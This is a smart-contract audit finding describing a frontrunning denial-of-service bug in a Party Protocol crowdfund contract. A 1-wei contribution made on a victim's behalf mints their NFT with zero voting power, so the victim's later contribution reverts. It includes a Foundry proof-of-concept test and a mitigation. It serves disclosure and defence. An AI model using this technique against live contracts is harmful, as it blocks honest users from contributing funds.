## Tags

- bug
- 2 (Med Risk)
- satisfactory
- selected for report
- sponsor confirmed
- M-05

# [Possible DOS attack using dust in `ReraiseETHCrowdfund._contribute()`](https://github.com/code-423n4/2023-04-party-findings/issues/18) 

# Lines of code

https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L238


# Vulnerability details

## Impact
Normal contributors wouldn't contribute to the crowdfund properly by a malicious frontrunner.

## Proof of Concept
When users contribute to the `ReraiseETHCrowdfund`, it mints the crowdfund NFT in `_contribute()`.

```solidity
File: 2023-04-party\contracts\crowdfund\ReraiseETHCrowdfund.sol
228:         votingPower = _processContribution(contributor, delegate, amount);
229: 
230:         // OK to contribute with zero just to update delegate.
231:         if (amount == 0) return 0;
232: 
233:         uint256 previousVotingPower = pendingVotingPower[contributor];
234: 
235:         pendingVotingPower[contributor] += votingPower;
236: 
237:         // Mint a crowdfund NFT if this is their first contribution.
238:         if (previousVotingPower == 0) _mint(contributor); //@audit DOS by sending dust
```

As we can see, it mints the NFT when `previousVotingPower == 0` to mint for the first contribution.

But `votingPower` from `_processContribution()` might be 0 even if `amount > 0` and `pendingVotingPower[contributor]` would be remained as 0 after the first contribution.

Then this function will revert from the second contribution as it tries to mint the NFT again.

The below shows the detailed scenario and POC.

1. Let's assume `exchangeRateBps = 5e3`. So [votingPower for 1 wei is zero](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L233). Also, [from the test configurations](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/sol-tests/crowdfund/ReraiseETHCrowdfund.t.sol#L251), it's not a strong condition to assume `minContributions = 0`.
2. After noticing an honest user contributes with 1 ether, an attacker frontruns `contributeFor()` for the honest user with 1 wei.
3. Then the crowdfund NFT of the honest user will be minted but the voting power is still 0.
4. During the honest user's `contribute()`, it will try to mint the NFT again as [previousVotingPower == 0](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L238) and revert. So he can't contribute for this crowdfund.

While executing the POC, [opts.exchangeRateBps](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/sol-tests/crowdfund/ReraiseETHCrowdfund.t.sol#L72) should be `5e3`.

```solidity
    function test_contribute_DOSByFrontrunnerWithDust() public {
        ReraiseETHCrowdfund crowdfund = _createCrowdfund({
            initialContribution: 0,
            initialContributor: payable(address(0)),
            initialDelegate: address(0),
            minContributions: 0,
            maxContributions: type(uint96).max,
            disableContributingForExistingCard: false,
            minTotalContributions: 3 ether,
            maxTotalContributions: 5 ether,
            duration: 7 days,
            fundingSplitBps: 0,
            fundingSplitRecipient: payable(address(0))
        });

        address attacker = _randomAddress();
        address honest = _randomAddress();
        vm.deal(attacker, 1); //attacker has 1 wei
        vm.deal(honest, 1 ether); //honest user has 1 ether

        // Contribute
        vm.startPrank(attacker); //attacker frontruns for the honest user
        crowdfund.contributeFor{ value: 1 }(payable(honest), honest, "");
        vm.stopPrank();

        assertEq(crowdfund.balanceOf(honest), 1); //crowdfund NFT of the honest users was minted
        assertEq(crowdfund.pendingVotingPower(honest), 0); //voting power = 0 because of the low exchangeRateBps

        vm.expectRevert(
            abi.encodeWithSelector(
                CrowdfundNFT.AlreadyMintedError.selector,
                honest,
                uint256(uint160(honest))
            )
        );
        vm.startPrank(honest); //when the honest user contributes, reverts
        crowdfund.contribute{ value: 1 ether }(honest, "");
        vm.stopPrank();
    }
```

## Tools Used
Manual Review

## Recommended Mitigation Steps
Recommend minting the crowdfund NFT when the new `votingPower` is positive. Then we can avoid duplicate mints.

```solidity
File: 2023-04-party\contracts\crowdfund\ReraiseETHCrowdfund.sol
233:         uint256 previousVotingPower = pendingVotingPower[contributor];
234: 
235:         pendingVotingPower[contributor] += votingPower;
236: 
237:         // Mint a crowdfund NFT if this is their first meaningful contribution.
238:         if (previousVotingPower == 0 && votingPower != 0) _mint(contributor); //++++++++++++++++
```